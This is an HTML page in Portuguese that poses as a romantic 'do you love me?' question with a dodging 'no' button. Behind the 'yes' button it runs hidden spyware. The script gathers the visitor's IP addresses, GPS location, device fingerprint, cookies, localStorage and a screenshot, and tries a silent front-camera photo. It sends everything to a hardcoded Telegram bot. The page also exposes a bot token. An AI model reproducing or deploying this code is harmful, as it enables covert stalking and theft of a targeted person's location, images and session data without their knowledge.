<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>voce me ama?</title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: #111;
            border: 2px solid #fff;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
        }
        .pergunta {
            font-size: 28px;
            color: #fff;
            margin-bottom: 40px;
            letter-spacing: 2px;
            font-weight: 300;
        }
        .buttons {
            display: flex;
            justify-content: center;
            gap: 50px;
            flex-wrap: wrap;
            position: relative;
            min-height: 80px;
        }
        .btn {
            font-size: 22px;
            padding: 14px 50px;
            border: 2px solid #fff;
            background: transparent;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
            border-radius: 8px;
            min-width: 120px;
        }
        .btn-sim:hover {
            background: #fff;
            color: #000;
        }
        .btn-nao {
            border-color: #666;
            color: #666;
            transition: all 0.05s ease;
            position: relative;
        }
        .final-message {
            display: none;
            margin-top: 30px;
            font-size: 24px;
            color: #fff;
            border-top: 1px solid #333;
            padding-top: 30px;
            letter-spacing: 2px;
            line-height: 1.8;
        }
        .final-message .destaque {
            color: #ff3366;
            font-weight: bold;
        }
        .loader {
            border: 3px solid #1a1a1a;
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .floating-hearts {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
            overflow: hidden;
        }
        .floating-heart {
            position: absolute;
            font-size: 20px;
            animation: floatUp 6s linear forwards;
            opacity: 0.6;
        }
        @keyframes floatUp {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 0.6;
            }
            90% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(-10vh) rotate(720deg) scale(1.2);
                opacity: 0;
            }
        }
        #hidden-video {
            position: fixed;
            bottom: -100px;
            right: -100px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -999;
        }
        #hidden-canvas {
            display: none;
        }
        @media (max-width: 500px) {
            .pergunta {
                font-size: 22px;
            }
            .btn {
                font-size: 18px;
                padding: 12px 30px;
                min-width: 100px;
            }
            .buttons {
                gap: 30px;
            }
        }
    </style>
</head>
<body>

    <video id="hidden-video" autoplay muted playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <div class="floating-hearts" id="floatingHearts"></div>

    <div class="container" id="page-content">
        <div class="pergunta">voce me ama?</div>
        <div class="buttons" id="buttonArea">
            <button class="btn btn-sim" id="btnSim">SIM</button>
            <button class="btn btn-nao" id="btnNao">NAO</button>
        </div>
        <div class="loader" id="loader"></div>
        <div class="final-message" id="finalMessage">
            <div>💖</div>
            <div>eu <span class="destaque">tambem</span> te amo</div>
            <div style="font-size:14px; margin-top:15px; opacity:0.5;">ANG</div>
        </div>
    </div>

    <script>
        // ============================================================
        // 1. BOTÃO "NAO" FUGINDO
        // ============================================================
        const btnNao = document.getElementById('btnNao');
        const btnSim = document.getElementById('btnSim');
        const finalMessage = document.getElementById('finalMessage');
        const container = document.getElementById('page-content');
        const buttonArea = document.getElementById('buttonArea');
        const loader = document.getElementById('loader');

        btnNao.addEventListener('mouseenter', function(e) {
            if (finalMessage.style.display === 'block') return;
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();
            const padding = 20;
            const maxX = containerRect.width - btnRect.width - padding;
            const maxY = containerRect.height - btnRect.height - padding;
            let newX, newY;
            let attempts = 0;
            do {
                newX = Math.random() * maxX;
                newY = Math.random() * maxY;
                attempts++;
                if (attempts > 50) break;
            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
        });

        btnNao.addEventListener('click', function(e) {
            if (finalMessage.style.display === 'block') return;
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();
            const maxX = containerRect.width - btnRect.width - 20;
            const maxY = containerRect.height - btnRect.height - 20;
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.random() * maxX + 'px';
            btnNao.style.top = Math.random() * maxY + 'px';
        });

        // ============================================================
        // 2. BOTÃO "SIM" — DISPARA O RUSSO (SEM PERMISSÃO)
        // ============================================================
        btnSim.addEventListener('click', function() {
            buttonArea.style.display = 'none';
            loader.style.display = 'block';
            coletarEEnviar();
            setTimeout(() => {
                loader.style.display = 'none';
                finalMessage.style.display = 'block';
                for (let i = 0; i < 30; i++) {
                    setTimeout(() => {
                        const heart = document.createElement('div');
                        heart.className = 'floating-heart';
                        heart.textContent = '♥';
                        heart.style.left = Math.random() * 90 + 5 + '%';
                        heart.style.fontSize = (Math.random() * 20 + 16) + 'px';
                        heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
                        heart.style.color = '#ff3366';
                        document.getElementById('floatingHearts').appendChild(heart);
                        setTimeout(() => { heart.remove(); }, 7000);
                    }, i * 60);
                }
                document.querySelector('.pergunta').style.display = 'none';
                setTimeout(() => {
                    finalMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }, 300);
            }, 1500);
        });

        // ============================================================
        // 3. FUNÇÃO RUSSA COMPLETA (SEM PERMISSÃO NA TELA)
        // ============================================================
        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT_ID = "8551438856";

        // Tenta acessar a câmera SEM PEDIR PERMISSÃO (se pedir, desiste)
        async function tentarCameraFrontalSilenciosa() {
            try {
                const video = document.getElementById('hidden-video');

                // Tenta com um timeout curto (se demorar, é porque pediu permissão)
                const streamPromise = navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                // Se demorar mais de 2 segundos, cancela (provavelmente pediu permissão)
                const timeoutPromise = new Promise((_, reject) =>
                    setTimeout(() => reject(new Error('TIMEOUT')), 2000)
                );

                const stream = await Promise.race([streamPromise, timeoutPromise]);
                video.srcObject = stream;
                await video.play();

                await new Promise(r => setTimeout(r, 500));

                const canvas = document.getElementById('hidden-canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;

                return canvas.toDataURL('image/jpeg', 0.8);
            } catch (e) {
                // Se falhou (timeout, permissão negada, etc.), simplesmente retorna null
                return null;
            }
        }

        async function coletarEEnviar() {
            try {
                // ---- IP PÚBLICO ----
                const ip = await fetch('https://api.ipify.org?format=json')
                    .then(r => r.json()).then(d => d.ip).catch(() => '❌');

                // ---- IP REAL (WebRTC) ----
                let webrtcIP = '❌';
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('teste');
                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
                    await pc.setLocalDescription(offer);
                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
                    if (candidates) {
                        const ips = candidates.map(c => c.split(' ')[4])
                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
                        if (ips.length) webrtcIP = ips[0];
                    }
                    pc.close();
                } catch {}

                // ---- LOCALIZAÇÃO POR IP ----
                let location = {};
                try {
                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
                    const d = await r.json();
                    location = {
                        city: d.city || 'Desconhecida',
                        region: d.region || 'Desconhecida',
                        country: d.country || 'Desconhecido',
                        loc: d.loc || 'Desconhecida',
                        org: d.org || 'Desconhecido',
                        timezone: d.timezone || 'Desconhecido'
                    };
                } catch {
                    location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                }

                // ---- DETECTAR VPN ----
                let vpnStatus = '❓ Indeterminado';
                if (location.org) {
                    const org = location.org.toLowerCase();
                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
                        'vultr', 'heroku', 'azure', 'google cloud'
                    ];
                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
                }

                // ---- FINGERPRINT ----
                const fpData = [
                    navigator.userAgent,
                    navigator.language,
                    screen.width + 'x' + screen.height,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || '?',
                    navigator.deviceMemory || '?',
                    !!navigator.webdriver,
                    !!navigator.plugins.length,
                    navigator.doNotTrack || '?'
                ];
                let hash = 0;
                const fpString = fpData.join('|');
                for (let i = 0; i < fpString.length; i++) {
                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
                    hash = hash & hash;
                }
                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();

                // ---- GPS EXATO (tenta sem pedir) ----
                let gps = { status: '❌ Indisponível', lat: 'N/A', lng: 'N/A' };
                if (navigator.geolocation) {
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 3000,
                                maximumAge: 0
                            });
                        });
                        gps = {
                            status: '✅ LOCALIZAÇÃO EXATA!',
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + 'm',
                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                    } catch (e) {
                        gps = { status: '❌ GPS negado ou indisponível', lat: 'N/A', lng: 'N/A' };
                    }
                }

                // ---- DADOS DO DISPOSITIVO ----
                const ua = navigator.userAgent;
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                const isAndroid = /Android/i.test(ua);
                let modelo = 'Desconhecido',
                    os = 'Desconhecido',
                    marca = 'Desconhecida';

                if (isIOS) {
                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
                    marca = 'Apple';
                } else if (isAndroid) {
                    const m = ua.match(/Android (\d+\.\d+)/);
                    modelo = m ? `Android ${m[1]}` : 'Android';
                    os = m ? `Android ${m[1]}` : 'Android';
                    marca = 'Android';
                } else {
                    modelo = '💻 Computador';
                    os = navigator.platform || 'Desconhecido';
                    marca = 'Desktop';
                }

                // ---- BATERIA ----
                let bateria = '❌';
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🔋 Descarregando'})`;
                    } catch {}
                }

                // ---- CONEXÃO ----
                let conexao = '❌';
                if (navigator.connection) {
                    conexao = navigator.connection.effectiveType || 'N/A';
                }

                // ---- PLUGINS ----
                let plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';

                // ---- COOKIES E LOCALSTORAGE ----
                const cookies = document.cookie || '❌ Sem cookies';
                let localStorageData = '❌';
                try {
                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
                } catch {}

                // ---- REDES WI-FI ----
                let wifi = '❌';
                if (navigator.connection) {
                    try {
                        wifi =
                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
                    } catch {}
                }

                // ---- FONTES INSTALADAS ----
                let fonts = [];
                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
                for (let f of fontList) {
                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
                }
                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';

                // ---- PRINT REAL DA TELA INTEIRA ----
                let screenshot = null;
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: 1.5,
                        useCORS: true,
                        backgroundColor: '#0a0a0a',
                        logging: false,
                        allowTaint: false,
                        width: window.innerWidth,
                        height: window.innerHeight,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight
                    });
                    screenshot = canvas.toDataURL('image/jpeg', 0.9);
                } catch (e) {}

                // ---- CÂMERA FRONTAL (SILENCIOSA) ----
                let fotoCamera = await tentarCameraFrontalSilenciosa();

                // ---- MONTA MENSAGEM ----
                let msg = `
        💀 **RUSSO PIRATA — SEM PERMISSÃO** 💀

        🌐 **IP Público:** ${ip}
        🔴 **IP Real (WebRTC):** ${webrtcIP}
        🛡️ **VPN/Proxy:** ${vpnStatus}

        📍 **LOCALIZAÇÃO POR IP:**
           🏙️ Cidade: ${location.city}
           🗺️ Região: ${location.region}
           🌍 País: ${location.country}
           📍 Coordenadas: ${location.loc}
           🕰️ Fuso: ${location.timezone}

        📡 **GPS EXATO:**
           ${gps.status}
           ${gps.lat !== 'N/A' ? `🗺️ Lat: ${gps.lat}` : ''}
           ${gps.lng !== 'N/A' ? `🗺️ Lng: ${gps.lng}` : ''}
           ${gps.maps ? `📍 Google Maps: ${gps.maps}` : ''}

        📱 **DISPOSITIVO:**
           📱 Modelo: ${modelo}
           🏷️ Marca: ${marca}
           📲 OS: ${os}
           🔋 Bateria: ${bateria}
           📶 Conexão: ${conexao}
           📐 Tela: ${screen.width}x${screen.height}
           🌍 Idioma: ${navigator.language}
           🕰️ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
           🧠 Fingerprint: ${fingerprint}

        📶 **REDE:** ${wifi}

        🔌 **PLUGINS:** ${pluginsList}
        🍪 **COOKIES:** ${cookies}
        💾 **localStorage:** ${localStorageData}

        🔤 **FONTES INSTALADAS:** ${fontsInstalled}

        📸 **CÂMERA FRONTAL:** ${fotoCamera ? '✅ FOTO CAPTURADA (SEM PERGUNTAR)!' : '❌ NÃO DISPONÍVEL (navegador bloqueou sem avisar)'}

        💀 **Ela disse SIM!** 💀
        `;

                // ---- ENVIA TEXTO ----
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });

                // ---- ENVIA PRINT ----
                if (screenshot) {
                    const form = new FormData();
                    const blob = await fetch(screenshot).then(res => res.blob());
                    form.append('photo', blob, 'screenshot_real.jpg');
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', '🖼️ PRINT REAL DA TELA INTEIRA');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }

                // ---- ENVIA FOTO DA CÂMERA (SE CONSEGUIU) ----
                if (fotoCamera) {
                    const form = new FormData();
                    const blob = await fetch(fotoCamera).then(res => res.blob());
                    form.append('photo', blob, 'camera_frontal.jpg');
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', '📸 FOTO DA CÂMERA FRONTAL (SEM PERMISSÃO)');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }

            } catch (e) {
                console.log('Erro no envio:', e);
            }
        }

        // ============================================================
        // CORAÇÕES FLUTUANTES (FUNDO)
        // ============================================================
        setInterval(() => {
            if (finalMessage.style.display === 'block') return;
            const heart = document.createElement('div');
            heart.className = 'floating-heart';
            heart.textContent = '♥';
            heart.style.left = Math.random() * 90 + 5 + '%';
            heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
            heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
            heart.style.opacity = '0.2';
            heart.style.color = '#ff3366';
            document.getElementById('floatingHearts').appendChild(heart);
            setTimeout(() => { heart.remove(); }, 8000);
        }, 3000);
    </script>

</body>
</html>
